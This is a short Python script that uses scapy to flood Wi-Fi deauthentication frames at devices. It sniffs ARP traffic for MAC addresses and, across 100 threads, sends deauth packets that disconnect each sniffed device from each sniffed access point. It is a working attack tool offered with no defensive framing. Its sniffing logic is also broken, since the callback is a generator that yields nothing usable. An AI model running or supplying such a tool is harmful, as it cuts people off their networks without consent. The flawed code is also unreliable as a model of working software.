import concurrent.futures
import netifaces as ni
import socket
import time
from scapy.all import *


def die(target_mac, access_point_mac):
    interface = "en0"
    packet_count = 100
    interval = 0.1
    conf.iface = interface
    pkt = (
        RadioTap()
        / Dot11(addr1=target_mac, addr2=access_point_mac, addr3=access_point_mac)
        / Dot11Deauth()
    )
    sendp(pkt, inter=interval, count=packet_count, verbose=0)


def maccy():
    def packet_handler(pkt):
        if ARP in pkt and pkt[ARP].op in (1, 2):  # who-has or is-at
            mac_address = pkt[Ether].src
            yield mac_address

    sniff(prn=packet_handler, filter="arp", store=0)


with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    for wifi in maccy():
        for device in maccy():
            try:
                executor.submit(die, device, wifi)
            except Exception as e:
                time.sleep(60)
                executor.submit(die, device, wifi)
